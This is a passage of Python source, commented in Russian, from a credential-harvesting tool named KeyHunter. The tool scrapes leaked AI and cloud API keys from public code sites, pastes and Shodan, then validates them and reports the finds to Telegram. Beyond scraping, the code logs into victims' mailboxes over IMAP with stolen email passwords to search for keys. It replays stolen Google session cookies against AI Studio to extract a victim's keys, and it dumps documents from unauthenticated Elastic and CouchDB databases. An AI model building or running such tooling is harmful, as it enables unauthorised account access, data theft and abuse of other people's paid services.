            and not quota_burned
            and (
                star_hit or valuable_tag or nonllm_working or fat_balance or many_models
            )
        ):
            post_telegram(rep)
            v["_tg_posted"] = True
            return True
        elif quota_burned:
            log("  🟡 пропущен постинг: квота выжжена (в стор, окно обнулится)")
        elif status == "open_relay":
            log("  🔓 пропущен постинг: open_relay (эндпоинт без проверки ключей)")
        elif status == "no_balance":
            log("  🟠 пропущен постинг: no_balance (ключ валиден, денег нет)")
        elif is_free_oat:
            log("  ⚪ пропущен постинг: oat01 free-tier (не подписка)")
        else:
            log("  🔕 пропущен постинг: без звёзд/денег (хлам не шлём)")
        # фильтр-скип детерминирован: в конце цикла решение будет тем же —
        # помечаем, чтобы end-of-cycle петля не логировала репорт повторно.
        # (исключение выше флаг НЕ ставит — там ретрай уместен)
        v["_tg_posted"] = True
    except Exception as e:
        log("  post_finding_now err: %s" % e)
    return False


DESKTOP_DROP = os.path.join(os.path.expanduser("~"), "Desktop", "AI_KEYS_FOUND.txt")


def desk_drop(v):
    """Пишем каждую находку на Рабочий стол (по требованию юзера)."""
    try:
        stars = v.get("stars_working") or (v.get("stars_listed") or [])[:6]
        block = []
        if not os.path.exists(DESKTOP_DROP):
            block.append("=" * 70)
            block.append("API KEYS — KeyHunter автодроп на десктоп")
            block.append("=" * 70)
        block.append("")
        block.append("🌐 Base URL: %s" % v["base"])
        block.append("🔑 Ключ:     %s" % v["key"])
        block.append(
            "📅 Найден:   %s" % datetime.datetime.now().strftime("%Y-%m-%d %H:%M")
        )
        block.append("📍 Источник: %s" % str(v.get("origin"))[:120])
        if stars:
            block.append("⭐ Модели:   %s" % ", ".join(stars[:8]))
        block.append("─" * 70)
        with LOCK:
            with open(DESKTOP_DROP, "a", encoding="utf-8") as f:
                f.write("\n".join(block) + "\n")
    except Exception:
        pass


_STORE_KHASH = None  # ленивый индекс khash стора (self-dedup)


def _store_khash_index():
    """Ленивый индекс khash всех записей стора. store() без него аппендил
    ВСЛЕПУЮ: open-infra делал store(rec) И возвращал JSON-чанк -> пайплайн
    извлекал тот же ключ как sk20 -> второй store -> дубль (113 групп)."""
    global _STORE_KHASH
    if _STORE_KHASH is None:
        _STORE_KHASH = set()
        try:
            with open(STORE_PATH, encoding="utf-8") as f:
                for line in f:
                    if not line.strip():
                        continue
                    try:
                        j = json.loads(line)
                    except Exception:
                        continue
                    _STORE_KHASH.add(khash(j.get("key", ""), j.get("base")))
        except Exception:
            pass
    return _STORE_KHASH


def store(v):
    h = khash(v.get("key", ""), v.get("base"))
    with LOCK:
        idx = _store_khash_index()
        if h in idx:
            return False  # дубль (key+base уже в сторе) — не аппендим
        with open(STORE_PATH, "a", encoding="utf-8") as f:
            f.write(json.dumps(v, ensure_ascii=False) + "\n")
        idx.add(h)
    desk_drop(v)
    return True


# ------------------------------------------------------------------ ORCHESTRATOR


# Rate limit tracking: skip sources that hit rate limits
RATE_LIMITED = {}  # {source_name: skip_until_cycle}
CYCLE_COUNTER = 0
SOURCE_HEALTH_PATH = os.path.join(HERE, "source_health.json")
SOURCE_HEALTH_LOCK = threading.RLock()


def _load_source_health():
    with SOURCE_HEALTH_LOCK:
        try:
            with open(SOURCE_HEALTH_PATH, encoding="utf-8") as f:
                data = json.load(f)
            return data if isinstance(data, dict) else {}
        except Exception:
            return {}


def _save_source_health(data):
    with SOURCE_HEALTH_LOCK:
        try:
            tmp = SOURCE_HEALTH_PATH + ".tmp"
            with open(tmp, "w", encoding="utf-8") as f:
                json.dump(data, f, ensure_ascii=False, indent=1)
            os.replace(tmp, SOURCE_HEALTH_PATH)
        except Exception:
            pass


def source_health_remaining(source_name):
    """Return persisted circuit-breaker skip cycles for a source."""
    with SOURCE_HEALTH_LOCK:
        data: typing.Dict[str, typing.Any] = _load_source_health()
        entry = data.get(source_name) or {}
        try:
            return max(0, int(entry.get("skip_left", 0)))
        except Exception:
            return 0


def source_health_begin_cycle():
    """Consume one skip cycle for every source currently circuit-broken.

    The decrement happens after the current skip decision is read, so a value
    of 5 means the source is skipped for exactly five subsequent calls.
    """
    with SOURCE_HEALTH_LOCK:
        data: typing.Dict[str, typing.Any] = _load_source_health()
        changed = False
        for entry in data.values():
            if not isinstance(entry, dict):
                continue
            try:
                left = max(0, int(entry.get("skip_left", 0)))
            except Exception:
                left = 0
            if left:
                entry["skip_left"] = left - 1
                changed = True
        if changed:
            _save_source_health(data)


def note_source_health(source_name, ok, reason=""):
    """Record a completed source call and open the breaker after 3 failures."""
    with SOURCE_HEALTH_LOCK:
        data: typing.Dict[str, typing.Any] = _load_source_health()
        raw_entry = data.get(source_name)
        entry: typing.Dict[str, typing.Any] = (
            dict(raw_entry) if isinstance(raw_entry, dict) else {}
        )
        if ok:
            entry["failures"] = 0
            entry["skip_left"] = 0
        else:
            try:
                failures = int(entry.get("failures", 0)) + 1
            except Exception:
                failures = 1
            entry["failures"] = failures
            entry["last_error"] = reason[:200] if reason else "source failure"
            if failures >= 3:
                entry["failures"] = 0
                entry["skip_left"] = 5
                log("  ⛔ [%s] 3 сбоя подряд — автоскип на 5 циклов" % source_name)
        entry["last_cycle"] = CYCLE_COUNTER
        data[source_name] = entry
        _save_source_health(data)


def should_skip_source(source_name):
    """Check if source should be skipped due to rate limit."""
    global CYCLE_COUNTER
    if source_name in RATE_LIMITED:
        if CYCLE_COUNTER < RATE_LIMITED[source_name]:
            return True
        else:
            del RATE_LIMITED[source_name]
    return False


def mark_rate_limited(source_name, backoff_cycles=3):
    """Mark source as rate-limited, skip for N cycles."""
    global CYCLE_COUNTER
    RATE_LIMITED[source_name] = CYCLE_COUNTER + backoff_cycles
    log("  ⏸️  %s rate-limited, skip %d cycles" % (source_name, backoff_cycles))


# Adaptive source priority: track which sources yield most candidates
SOURCE_STATS = {}  # {source_name: {"last_yield": int, "priority": float}}


def update_source_priority(source_name, n_candidates):
    """Boost priority if source yielded many new candidates."""
    if source_name not in SOURCE_STATS:
        SOURCE_STATS[source_name] = {"last_yield": 0, "priority": 1.0}
    SOURCE_STATS[source_name]["last_yield"] = n_candidates
    # adaptive boost: >50 candidates = 2x priority, >100 = 3x
    if n_candidates > 100:
        SOURCE_STATS[source_name]["priority"] = 3.0
    elif n_candidates > 50:
        SOURCE_STATS[source_name]["priority"] = 2.0
    else:
        # decay priority over time
        SOURCE_STATS[source_name]["priority"] = max(
            1.0, SOURCE_STATS[source_name]["priority"] * 0.9
        )


_FILEHOST_RE = re.compile(
    r"https?://(?:anonfiles\.com|pixeldrain\.com|file\.io|"
    r"mediafire\.com|gofile\.io)/[A-Za-z0-9/_.\-]+",
    re.I,
)
_COMBO_HINT_RE = re.compile(
    r"combo|mail:pass|mail pass|email:pass|combo list|"
    r"claude|chatgpt|account dump|db dump",
    re.I,
)


def _chase_files(chunks):
    """🎣 FILE-CHASER: ссылки на файлы-комболисты из горячих чанков ->
    качаем (до 8/цикл, 3МБ) -> текст как новые чанки. Сцена раздаёт
    комблисты именно через файл-хостинги."""
    urls = []
    seen_u = set()
    for text, _origin in chunks:
        if not _COMBO_HINT_RE.search(text or ""):
            continue
        for u in _FILEHOST_RE.findall(text):
            u = u.rstrip('").,]')
            if u not in seen_u:
                seen_u.add(u)
                urls.append(u)
        if len(urls) >= 14:
            break
    out = []
    for u in urls[:8]:
        try:
            target = u
            # pixeldrain: страница-просмотр -> прямая ссылка
            if "pixeldrain.com/l/" in u:
                target = u.replace("/l/", "/api/file/") + "?download"
            r = http("GET", target, timeout=(8, 25))
            if r is None or r.status_code != 200:
                continue
            body = r.text
            # anonfiles/mediafire: страница с кнопкой -> выцепляем прямую
            if "text/html" in (r.headers.get("content-type") or ""):
                m = re.search(
                    r'href="(https://[^"]*(?:download|file|anonfiles|'
                    r'mediafire)[^"]*)"',
                    body,
                    re.I,
                )
                if m:
                    r = http("GET", m.group(1), timeout=(8, 25))
                    if r is not None and r.status_code == 200:
                        body = r.text
                    else:
                        continue
                else:
                    continue
            if len(body) > 300:
                out.append((body[:500_000], "file-chase:%s" % u[:80]))
                log("  [file-chase] +%d KB от %s" % (len(body) // 1024, u[:55]))
        except Exception:
            continue
    return out


def run_sources(extra_paths=()):
    # РОТАЦИЯ: горячие источники — всегда, остальные — по очереди (каждый цикл разные)
    HOT_SOURCES = {
        "leakix",
        "github-code",
        "gist-search",
        "pastes-mega",
        "github-commits",
        "github-gists",
        "github-issues",
        "gh-events",
        "npm",
        "pypi",
        "4chan",
        "pullpush-reddit",
        "hf-spaces",
        "relay-scanner",
        "shodan",
        "open-infra",
        "criminalip",
        "searchcode",
        "publicwww",
        "hf-datasets",
        # разогнанные: кравлеры + жирные бесплатные
        "censys",
        "netlas",
        "zoomeye",
        "urlscan",
        "gitlab-snippets",
        "grep.app",
        "hn",
        "stackoverflow",
        "v2ex",
        "lobsters",
        "dockerhub",
        "kaggle",
        "pastebin",
        "feeds",
        "virustotal",
        "wayback",
        # P2: безключевой фидер cc-sweep — каждый цикл
        "internetdb",
        # Unconventional: глобальный код-поиск без ключа
        "sourcegraph",
        # 🚪 зона нулевой конкуренции: anon FTP/NAS с бэкапами сессий
        "anon-ftp",
        # 🤗 глобальный full-text по huggingface без ключа
        "hf-search",
        # 🔷 спецохота baseten: docker ENV литералы + grep.app
        "baseten-hunter",
        # 📡 TG-поисковики: контент каналов сцены (комблисты/аккаунты)
        "tg-search",
    }
    all_sources = [cls() for cls in ALL_SOURCE_CLASSES]
    # жёсткий выключатель из конфига (open-infra и прочий слабый шум — вон)
    disabled = set(CFG.get("disabled_sources", []))
    if disabled:
        all_sources = [s for s in all_sources if s.name not in disabled]
    # фильтруем rate-limited и circuit-broken источники
    skipped_health = {
        s.name for s in all_sources if source_health_remaining(s.name) > 0
    }
    if skipped_health:
        log(
            "  ⏭ source health skip: %s"
            % ", ".join(
                "%s[%d]" % (name, source_health_remaining(name))
                for name in sorted(skipped_health)
            )
        )
    # Decrement only after the skip decision above, so skip_left=5 means five
    # complete monitor cycles are skipped.
    source_health_begin_cycle()
    all_sources = [
        s
        for s in all_sources
        if not should_skip_source(s.name) and s.name not in skipped_health
    ]
    hot = [s for s in all_sources if s.name in HOT_SOURCES]
    cold = [s for s in all_sources if s.name not in HOT_SOURCES]

    # ВСЕ источники каждый цикл — максимум охвата (раньше cold сэмплировались 40%)
    import random

    cold_sample = cold
    sources = hot + cold_sample

    if extra_paths:
        sources.append(LocalFiles(list(extra_paths)))

    # РОТАЦИЯ ЗАПРОСОВ: каждый цикл берем подмножество SE/grep
    se_all = CFG.get("se_queries", [])
    grep_all = CFG.get("grep_queries", [])
    if se_all and len(se_all) > 8:
        # берем 50% запросов случайно + обязательные (ant/proj/or/svcacct + топ-провайдеры)
        MANDATORY_PATTERNS = (
            "sk-ant",
            "sk-proj",
            "sk-or",
            "sk-svcacct",
            "dashscope",
            "deepseek",
            "siliconflow",
            "opus",
            "glm-5",
        )
        mandatory = [
            q for q in se_all if any(x in q.lower() for x in MANDATORY_PATTERNS)
        ]
        optional = [q for q in se_all if q not in mandatory]
        # АУДИТ-фикс: random.sample(k > len(population)) = ValueError ->
        # падал ВЕСЬ цикл. Клампим размер выборки.
        se_sample = mandatory + random.sample(
            optional, min(len(optional), max(4, len(optional) // 2))
        )
        CFG["se_queries"] = se_sample
    if grep_all and len(grep_all) > 10:
        # берем 60% grep-запросов + обязательные провайдеры
        MANDATORY_GREP = (
            "deepseek",
            "dashscope",
            "siliconflow",
            "sk-ant",
            "sk-proj",
            "sk-or",
        )
        mandatory_grep = [
            q for q in grep_all if any(x in q.lower() for x in MANDATORY_GREP)
        ]
        optional_grep = [q for q in grep_all if q not in mandatory_grep]
        grep_sample = mandatory_grep + random.sample(
            optional_grep, min(len(optional_grep), max(3, len(optional_grep) // 2))
        )
        CFG["grep_queries"] = grep_sample

    chunks = []
    log(
        "=== SOURCES (%d: %d hot + %d cold-sampled) ==="
        % (len(sources), len(hot), len(cold_sample))
    )
    # ГЛОБАЛЬНЫЙ таймаут на источник: as_completed отдаёт только завершённые
    # фьючи, поэтому f.result(timeout=N) — мёртвый код. Один висун (se-ddg и
    # ко) иначе блокирует цикл бесконечно. По истечении бюджета — цикл идёт
    # дальше, повисший поток доживает в фоне.
    src_budget = int(CFG.get("source_timeout", 420))
    # АУДИТ-фикс: max_workers=0 (все источники выключены конфигом) = ValueError
    ex = concurrent.futures.ThreadPoolExecutor(max_workers=max(1, len(sources)))
    try:
        futs = {ex.submit(lambda s: s.fetch(), s): s for s in sources}
        try:
            for f in concurrent.futures.as_completed(futs, timeout=src_budget):
                s = futs[f]
                try:
                    res = f.result(timeout=5)
                    nbytes = sum(len(t) for t, _ in res)
                    chunks.extend(res)
                    note_source_health(s.name, True)
                    log(
                        "  [%-16s] %d chunks, %d KB"
                        % (s.name, len(res), nbytes // 1024)
                    )
                except Exception as e:
                    err_msg = str(e)
                    note_source_health(s.name, False, err_msg or type(e).__name__)
                    # детектим rate limit
                    if (
                        "429" in err_msg
                        or "403" in err_msg
                        or "rate" in err_msg.lower()
                    ):
                        mark_rate_limited(s.name, backoff_cycles=3)
                    else:
                        log("  [%-16s] FAIL %s" % (s.name, type(e).__name__))
        except concurrent.futures.TimeoutError:
            pass
        for f, s in futs.items():
            if not f.done():
                note_source_health(s.name, False, "timeout >%ds" % src_budget)
                log("  [%-16s] TIMEOUT >%ds — цикл продолжается" % (s.name, src_budget))
    finally:
        ex.shutdown(wait=False)

    # восстанавливаем полные списки для следующего цикла
    if se_all:
        CFG["se_queries"] = se_all
    if grep_all:
        CFG["grep_queries"] = grep_all

    # 🎣 file-chaser: комблисты на файл-хостингах (сцена раздаёт их так)
    try:
        chased = _chase_files(chunks)
        if chased:
            chunks.extend(chased)
    except Exception:
        pass

    return chunks


def deep_scan_on_find(origin, deadline=None):
    """Глубокое сканирование окружения при находке ключа.

    Deep-scan is enrichment, not the primary validation path.  It used to
    perform several sequential requests for every successful candidate and
    could turn one cycle into an hour-long tail.  The optional monotonic
    deadline keeps the enrichment bounded while preserving the main source
    and validation results.
    """
    chunks = []

    def _deep_http(method, url, timeout=(2, 4), headers=None):
        if deadline is not None:
            remaining = deadline - time.monotonic()
            if remaining <= 0.5:
                return None
            # http() may try proxy and direct sessions, so leave room for
            # both attempts inside the remaining budget.
            per_try = max(0.25, min(float(timeout[1]), remaining / 2.2))
            timeout = (min(float(timeout[0]), per_try), per_try)
        try:
            return http(method, url, timeout=timeout, headers=headers)
        except Exception:
            return None

    try:
        origin_str = str(origin)

        # GitHub: если нашли в репо — сканируем другие файлы того же репо
        if "github.com" in origin_str and "/blob/" in origin_str:
            # парсим owner/repo
            import re

            m = re.search(r"github\.com/([^/]+)/([^/]+)", origin_str)
            if m:
                owner, repo = m.groups()
                repo = repo.split("/")[0]  # убираем /blob/...
                # сканируем топ-файлы репо (README, config, .env examples)
                targets = [
                    "README.md",
                    "config.json",
                    ".env.example",
                    "docker-compose.yml",
                    "package.json",
                ]
                for fname in targets[:3]:
                    if deadline is not None and time.monotonic() >= deadline:
                        break
                    try:
                        url = f"https://raw.githubusercontent.com/{owner}/{repo}/main/{fname}"
                        r = _deep_http("GET", url, timeout=(2, 4))
                        if r and r.status_code == 200:
                            chunks.append((r.text, f"deep-scan:{owner}/{repo}/{fname}"))
                    except Exception:
                        pass

        # Gist: если нашли в gist — проверяем другие gists того же юзера
        elif "gist.github.com" in origin_str or "gist:" in origin_str:
            import re

            # парсим gist ID или username
            m = re.search(r"gist\.github\.com/([^/]+)", origin_str)
            if not m:
                m = re.search(r"gist:([^/]+)", origin_str)
            if m:
                username = m.group(1)
                # берем последние 5 gists юзера
                try:
                    gh_headers = {"Accept": "application/vnd.github+json"}
                    if gh_token():
                        gh_headers["Authorization"] = "Bearer " + gh_token()
                    r = http(
                        "GET",
                        f"https://api.github.com/users/{username}/gists?per_page=5",
                        headers=gh_headers,
                        timeout=(2, 4),
                    )
                    if r and r.status_code == 200:
                        gists = r.json()
                        for g in gists[:2]:
                            for fn, fo in list((g.get("files") or {}).items())[:2]:
                                if (
                                    deadline is not None
                                    and time.monotonic() >= deadline
                                ):
                                    break
                                if fo.get("raw_url"):
                                    try:
                                        r2 = _deep_http(
                                            "GET", fo["raw_url"], timeout=(2, 4)
                                        )
                                        if r2 and r2.status_code == 200:
                                            chunks.append(
                                                (
                                                    r2.text,
                                                    f"deep-scan:gist:{username}/{fn}",
                                                )
                                            )
                                    except Exception:
                                        pass
                except Exception:
                    pass

        # Pastebin: если нашли на pastebin — проверяем другие pastes того же IP/user
        elif "pastebin.com" in origin_str:
            # pastebin не даёт API для "other pastes by author", skip
            pass

        # LeakIX: если нашли на хосте — сканируем /api/v1/models того же хоста
        elif "leakix:" in origin_str:
            import re

            m = re.search(r"leakix:([^:]+)", origin_str)
            if m:
                host = m.group(1)
                # пробуем /api/v1/models, /, /docs
                for path in ["/api/v1/models", "/"]:
                    if deadline is not None and time.monotonic() >= deadline:
                        break
                    try:
                        r = _deep_http("GET", f"https://{host}{path}", timeout=(2, 4))
                        if r and r.status_code == 200:
                            chunks.append(
                                (r.text, f"deep-scan:leakix-host:{host}{path}")
                            )
                    except Exception:
                        pass

        # 📬 MAILBOX: валидный email-cred -> сам ящик источник ключей.
        # Люди получают ключи письмами: OpenAI onboarding, hosting-панели,
        # .env бэкапы. IMAP BODY-поиск по ключевым паттернам + partial fetch.
        elif origin_str.startswith("mailbox:"):
            creds = origin_str[len("mailbox:") :]
            email, _, pwd = creds.partition("|")
            if email and pwd:
                domain = email.rsplit("@", 1)[-1].lower()
                host0 = IMAP_MAP.get(domain, ["imap." + domain])[0]
                if not host0:
                    host0 = "imap." + domain
                M = _imap_login(host0, email, pwd, timeout=6)
                if M is None and domain not in IMAP_MAP:
                    M = _imap_login("mail." + domain, email, pwd, timeout=6)
                if M is not None:
                    try:
                        for crit in (
                            '(BODY "sk-ant-")',
                            '(BODY "sk-proj-")',
                            '(BODY "AIzaSy")',
                            '(BODY "postgresql://")',
                        ):
                            if deadline is not None and time.monotonic() >= deadline:
                                break
                            try:
                                typ, data = M.search(None, crit)
                                for num in (data[0].split() or [])[-3:]:
                                    if (
                                        deadline is not None
                                        and time.monotonic() >= deadline
                                    ):
                                        break
                                    # partial fetch: первые 200KB тела письма
                                    typ2, d2 = M.fetch(num, "(BODY[TEXT]<0.200000>)")
                                    raw = b""
                                    if d2 and d2[0] and isinstance(d2[0], tuple):
                                        raw = d2[0][1] or b""
                                    txt = raw.decode("utf-8", "replace")
                                    if txt.strip():
                                        chunks.append((txt, "mailbox:%s" % email))
                            except Exception:
                                continue
                    finally:
                        try:
                            M.logout()
                        except Exception:
                            pass

        # 🍪 GOOGLE SESSION: живые куки -> AI Studio жертвы (ключи AIzaSy
        # видны в bootstrap страницы /app/apikey; extractor подберёт)
        elif origin_str.startswith("gcookie:"):
            cid = origin_str.split(":", 1)[1]
            try:
                pool = json.load(open(GCOOKIE_POOL_PATH, encoding="utf-8"))
                ck = (pool.get(cid) or {}).get("cookies")
                if ck:
                    for path in ("/app/apikey", "/app/prompts"):
                        if deadline is not None and time.monotonic() >= deadline:
                            break
                        r = _deep_http(
                            "GET",
                            "https://aistudio.google.com" + path,
                            timeout=(4, 8),
                            headers={
                                "Cookie": ck,
                                "User-Agent": UA["User-Agent"],
                            },
                        )
                        if r is not None and r.status_code == 200:
                            chunks.append((r.text, "gcookie-aistudio:%s" % cid))
            except Exception:
                pass

    except Exception as e:
        log("  deep_scan err: %s" % e)

    return chunks


# ════════════════════════════════════════ ЭВОЛЮЦИОННЫЙ ДВИЖОК 🧬
# Система сама открывает новые провайдеры и форматы из самих утечек:
# нашла ключ в файле -> выпарила имена переменных рядом (NOVITA_API_KEY?)
# -> сгенерировала новый запрос -> нашла новые файлы -> ещё эволюция.
# Самонаправляемая охота: ГДЕ искать решает сам бот по своим результатам.

EVOLVED_PATH = os.path.join(HERE, "query_evolved.json")
_EVOLVED_LOCK = threading.RLock()
_EVOLVED_CACHE = None

_VAR_NAME_RE = re.compile(
    r"\b([A-Z][A-Z0-9_]{2,38}(?:_API_KEY|_API_TOKEN|_KEY|_TOKEN))\b"
)
# шум фреймворков и публичные переменные (anon/public — не секреты)
_VAR_JUNK = re.compile(
    r"SESSION|CSRF|NEXTAUTH|JWT|ENCRYPTION|COOKIE|FLASK|DJANGO|PASSPORT|"
    r"RECAPTCHA|STRIPE_WEBHOOK|WEBHOOK_SECRET|MAPBOX|SENTRY_DSN|"
    r"NEXT_PUBLIC|_ANON_|PUBLIC_|_PUBLIC|EXAMPLE|SAMPLE|TEST_KEY",
    re.I,
)
_KNOWN_VARS = {
    "OPENAI_API_KEY",
    "ANTHROPIC_API_KEY",
    "GEMINI_API_KEY",
    "GOOGLE_API_KEY",
    "GOOGLE_AI_STUDIO_KEY",
    "BASETEN_API_KEY",
    "GROQ_API_KEY",
    "XAI_API_KEY",
    "MISTRAL_API_KEY",
    "COHERE_API_KEY",
    "OPENROUTER_API_KEY",
    "TOGETHER_API_KEY",
    "TOGETHERAI_API_KEY",
    "DEEPSEEK_API_KEY",
    "PERPLEXITY_API_KEY",
    "FIREWORKS_API_KEY",
    "REPLICATE_API_TOKEN",
    "HF_TOKEN",
    "HUGGINGFACE_TOKEN",
    "AZURE_OPENAI_API_KEY",
    "AWS_ACCESS_KEY_ID",
    "GITHUB_TOKEN",
    "SUPABASE_KEY",
    "SUPABASE_ANON_KEY",
    "ELEVENLABS_API_KEY",
    "NOVITA_API_KEY",
    "SILICONFLOW_API_KEY",
    "MOONSHOT_API_KEY",
    "ZHIPU_API_KEY",
    "DASHSCOPE_API_KEY",
    "MINIMAX_API_KEY",
    "DATABASE_URL",
    "DEEPINFRA_API_KEY",
    "GLAMA_API_KEY",
}


def _evolved_load():
    global _EVOLVED_CACHE
    with _EVOLVED_LOCK:
        if _EVOLVED_CACHE is None:
            try:
                _EVOLVED_CACHE = json.load(open(EVOLVED_PATH, encoding="utf-8"))
            except Exception:
                _EVOLVED_CACHE = {}
        return _EVOLVED_CACHE


def _evolved_save():
    with _EVOLVED_LOCK:
        try:
            json.dump(
                _EVOLVED_CACHE,
                open(EVOLVED_PATH, "w", encoding="utf-8"),
                ensure_ascii=False,
            )
        except Exception:
            pass


_EVOLVE_CYCLE_BUFFER = []  # новые форматы за цикл (батч в один TG-дайджест)


def evolve_from_text(text, origin=""):
    """🧬 Горячий файл (далал кандидатов) -> учим новые имена переменных.
    TG-дайджест батчем в конце цикла (не спамим на каждый файл)."""
    try:
        new_found = []
        with _EVOLVED_LOCK:
            ev = _evolved_load()
            for m in _VAR_NAME_RE.finditer(text or ""):
                var = m.group(1)
                if var in _KNOWN_VARS or var in ev:
                    continue
                if len(var) < 10 or _VAR_JUNK.search(var):
                    continue
                ev[var] = {
                    "query": '"%s" path:.env' % var,
                    "added": time.time(),
                    "origin": str(origin)[:100],
                    "hits": 0,
                    "notified": False,
                }
                new_found.append(var)
                _EVOLVE_CYCLE_BUFFER.append(var)
                if len(ev) >= 200:  # кап пула
                    break
            if new_found:
                log(
                    "  🧬 ЭВОЛЮЦИЯ: +%d формат(ов): %s"
                    % (len(new_found), ", ".join(new_found[:6]))
                )
                _evolved_save()
    except Exception:
        pass


def evolve_strategies():
    """🧬 v2 МУТАТОР СТРАТЕГИЙ: бот сам изобретает КАК искать.
    Берёт СВОИ продуктивные запросы (из своей статистики) и генерирует
    мутантов: смена расширения, добавление путей. Мутант с хитами
    закрепляется навсегда (через evolved_query_hit)."""
    try:
        QSTATS = os.path.join(HERE, "query_stats.json")
        try:
            qstats = json.load(open(QSTATS, encoding="utf-8"))
        except Exception:
            return
        top = [
            q
            for q, st in qstats.items()
            if st.get("items", 0) >= 40
            and st.get("zero_streak", 0) == 0
            and "repo:" not in q
        ][:4]
        if not top:
            return
        added = 0
        with _EVOLVED_LOCK:
            ev = _evolved_load()
            for q in top:
                # мутация: расширение файла (env -> yaml/json/...)
                if "extension:" in q:
                    for ext in ("yaml", "json", "txt", "cfg", "toml"):
                        mq = re.sub(r"extension:\w+", "extension:" + ext, q)
                        if mq != q and mq not in ev and len(ev) < 240:
                            ev[mq] = {
                                "query": mq,
                                "added": time.time(),
                                "origin": "mutant-ext:%s" % q[:35],
                                "hits": 0,
                                "notified": False,
                            }
                            added += 1
                # мутация: добавляем путь
                if "path:" not in q and len(q) < 90:
                    for p in (".config", ".claude", "secrets", "deploy"):
                        mq = "%s path:%s" % (q, p)
                        if mq not in ev and len(ev) < 240:
                            ev[mq] = {
                                "query": mq,
                                "added": time.time(),
                                "origin": "mutant-path:%s" % q[:35],
                                "hits": 0,
                                "notified": False,
                            }
                            added += 1
            if added:
                _evolved_save()
                log("  🧬 v2 МУТАТОР: +%d новых стратегий поиска" % added)
    except Exception:
        pass


def evolve_flush_digest():
    """Один TG-дайджест всех форматов, выученных за цикл (вместо спама)."""
    global _EVOLVE_CYCLE_BUFFER
    try:
        if _EVOLVE_CYCLE_BUFFER:
            uniq = list(dict.fromkeys(_EVOLVE_CYCLE_BUFFER))
            post_telegram(
                "🧬 Выучено за цикл: %d новых форматов: %s\n"
                "Запросы добавлены в охоту."
                % (len(uniq), ", ".join(uniq[:10]) + ("..." if len(uniq) > 10 else ""))
            )
        _EVOLVE_CYCLE_BUFFER = []
    except Exception:
        pass


def evolved_queries_for_rotation(n=4):
    """Свежайшие эволюционные запросы -> в батч github-code."""
    try:
        ev = _evolved_load()
        recent = sorted(
            ev.items(), key=lambda kv: (-kv[1].get("hits", 0), -kv[1].get("added", 0))
        )[:n]
        return [info["query"] for _var, info in recent]
    except Exception:
        return []


def evolved_query_hit(query, n_items):
    """Эволюционный запрос дал выдачу -> закрепляем + TG-отчёт."""
    try:
        with _EVOLVED_LOCK:
            ev = _evolved_load()
            for var, info in ev.items():
                if info.get("query") == query:
                    info["hits"] = info.get("hits", 0) + n_items
                    first = not info.get("notified")
                    info["notified"] = True
                    if first:
                        post_telegram(
                            "🧬 ЭВОЛЮЦИЯ СРАБОТАЛА: %s -> %d файлов найдено. "
                            "Закрепляю в горячей ротации." % (var, n_items)
                        )
                    _evolved_save()
                    return
    except Exception:
        pass


def opendb_sweep(cycle):
    """🗄️ OPEN-DB: открытые Elastic/Mongo/Redis/Couch по shodan — это СЫРЫЕ
    ДАМПЫ (индексы/базы с токенами внутри). Elastic: список индексов + сэмпл
    документов -> экстрактор -> валидация -> TG. Redis: PING без AUTH.
    Раз в 2 цикла, 2 запроса к shodan за свип (бережём кредиты)."""
    if cycle % 2:
        return []
    keys = Shodan()._alive_pool(Shodan()._key_pool())
    if not keys:
        return []
    key = keys[0]
    # персистентный дедуп хостов (TTL 7д): был respam — один и тот же открытый
    # Elastic постился в TG каждый свип, пока shodan его переиздавал
    _seen_path = os.path.join(HERE, "opendb_seen.json")
    try:
        _odb_seen = json.load(open(_seen_path, encoding="utf-8"))
    except Exception:
        _odb_seen = {}
    _odb_cut = time.time() - 7 * 86400
    _odb_seen = {h: t for h, t in _odb_seen.items() if t > _odb_cut}
    QUERIES = (
        ('port:9200 "cluster_name"', "elastic"),
        ('port:27017 "MongoDB"', "mongo"),
        ('port:6379 "redis_version"', "redis"),
        ('port:5984 "couchdb"', "couch"),
    )
    hosts, seen_h = [], set()
    rot = (cycle // 2) % len(QUERIES)
    for qi in (rot, (rot + 1) % len(QUERIES)):
        q, kind = QUERIES[qi]
        try:
            r = requests.get(
                "https://api.shodan.io/shodan/host/search",
                params={"key": key, "query": q, "page": 1 + ((cycle // 2) % 10)},
                timeout=(10, 30),
                verify=False,
            )
            if r.status_code != 200:
                continue
            dport = {"elastic": 9200, "mongo": 27017, "redis": 6379, "couch": 5984}[
                kind
            ]
            for mtc in (r.json().get("matches") or [])[:14]:
                ip = mtc.get("ip_str")
                if ip and ip not in seen_h:
                    seen_h.add(ip)
                    hosts.append((kind, ip, mtc.get("port") or dport))
        except Exception:
            continue
    if not hosts:
        return []
    out = []

    def probe(hp):
        kind, ip, port = hp
        base = "http://%s:%s" % (ip, port)
        hid = "%s:%s" % (ip, port)
        fresh = hid not in _odb_seen  # постим в TG только про новые хосты
        try:
            if kind == "elastic":
                r = requests.get(
                    base + "/_cat/indices?format=json", timeout=(3, 6), verify=False
                )
                if r.status_code != 200:
                    return []
                _odb_seen[hid] = time.time()
                idxs = r.json()
                names = [
                    i.get("index")
                    for i in idxs
                    if not str(i.get("index", "")).startswith(".")
                ]
                docs = sum(
                    int(i.get("docs.count") or 0)
                    for i in idxs
                    if str(i.get("docs.count", "")).isdigit()
                )
                if fresh:
                    post_telegram(
                        "🗄️ OPEN ELASTIC %s\n%d индексов, ~%d доков\n%s"
                        % (base, len(idxs), docs, ", ".join(str(n) for n in names[:8]))
                    )
                chunks = []
                fat = sorted(
                    (i for i in idxs if str(i.get("docs.count", "")).isdigit()),
                    key=lambda x: -int(x.get("docs.count") or 0),
                )
                for i in fat[:2]:
                    nm = i.get("index")
                    if not nm or str(nm).startswith("."):
                        continue
                    rr = requests.get(
                        "%s/%s/_search?size=3" % (base, nm),
                        timeout=(4, 8),
                        verify=False,
                    )
                    if rr.status_code == 200:
                        chunks.append((rr.text[:200_000], "opendb:%s/%s" % (base, nm)))
                return chunks
            if kind == "couch":
                r = requests.get(base + "/_all_dbs", timeout=(3, 6), verify=False)
                if r.status_code == 200 and r.text.startswith("["):
                    _odb_seen[hid] = time.time()
                    if fresh:
                        post_telegram(
                            "🗄️ OPEN COUCHDB %s — базы: %s" % (base, r.text[:200])
                        )
                    chunks = [(r.text, "opendb:%s" % base)]
                    # читаем ДОКУМЕНТЫ первых баз (было: только имена баз —
                    # а ключи/сессии лежат внутри документов)
                    try:
                        dbs = json.loads(r.text)[:3]
                        for dbn in dbs:
                            if not isinstance(dbn, str) or dbn.startswith("_"):
                                continue
                            rr = requests.get(
